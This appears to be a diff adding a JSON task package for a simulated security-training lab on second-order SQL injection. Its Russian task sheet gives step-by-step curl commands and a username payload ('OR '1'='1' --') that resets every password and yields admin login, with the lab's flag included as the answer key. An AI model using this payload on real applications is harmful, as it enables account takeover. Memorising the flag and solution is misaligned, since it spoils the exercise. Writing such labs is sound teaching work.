@@ -1,0 +1,39 @@
+{
+  "id": "web-second-order-injection",
+  "workdir": "/home/student/task",
+  "hostname": "lab",
+  "expect": {
+    "file": "/home/student/task/found.txt",
+    "contains": "nto{s3c0nd_0rd3r_p4ym3nt_l4t3r}"
+  },
+  "fs": [
+    { "path": "/home/student/task", "type": "dir" },
+    {
+      "path": "/home/student/task/task.md",
+      "text": "# Практика: second-order (stored) инъекция\n\nЦель — `https://app.example`. Регистрация **параметризована** и безопасна, а вот\nсмена пароля склеивает сохранённый `username` в SQL:\n\n    UPDATE users SET password='<newpass>' WHERE username='<username>'\n\nТвой логин сохраняется как строка и «взрывается» позже — на смене пароля.\n\n1. Зарегистрируй пользователя с payload в логине:\n   `curl -s -X POST https://app.example/register --data-urlencode \"username=attacker' OR '1'='1' -- \" --data-urlencode 'password=Passw0rd!'`\n2. Смени пароль — условие `OR '1'='1'` станет истинным для всех строк:\n   `curl -s -X POST https://app.example/change-password --data-urlencode 'newpass=hacked123' -b cookies.txt`\n3. Войди как `admin` с новым паролем и забери флаг:\n   `curl -s -X POST https://app.example/login --data-urlencode 'username=admin' --data-urlencode 'password=hacked123' | grep 'nto{' > found.txt`\n4. Набери `check`.\n"
+    }
+  ],
+  "tools": {
+    "curl": {
+      "help": "curl [опции] <url> — HTTP-клиент (эмуляция app.example)",
+      "cases": [
+        {
+          "match": "register",
+          "example": "-s -X POST https://app.example/register --data-urlencode \"username=attacker' OR '1'='1' -- \"",
+          "output": "{\"ok\":true,\"user\":\"attacker' OR '1'='1' -- \"}\n"
+        },
+        {
+          "match": "change-password",
+          "example": "-s -X POST https://app.example/change-password --data-urlencode 'newpass=hacked123' -b cookies.txt",
+          "output": "{\"ok\":true,\"updated\":true,\"rows_affected\":3}\n"
+        },
+        {
+          "match": "login",
+          "example": "-s -X POST https://app.example/login --data-urlencode 'username=admin' --data-urlencode 'password=hacked123'",
+          "output": "{\"ok\":true,\"user\":\"admin\",\"role\":\"administrator\",\"flag\":\"nto{s3c0nd_0rd3r_p4ym3nt_l4t3r}\"}\n"
+        }
+      ],
+      "fallback": "curl: в этой лабе эмулируются только /register, /change-password и /login на app.example.\n"
+    }
+  }
+}
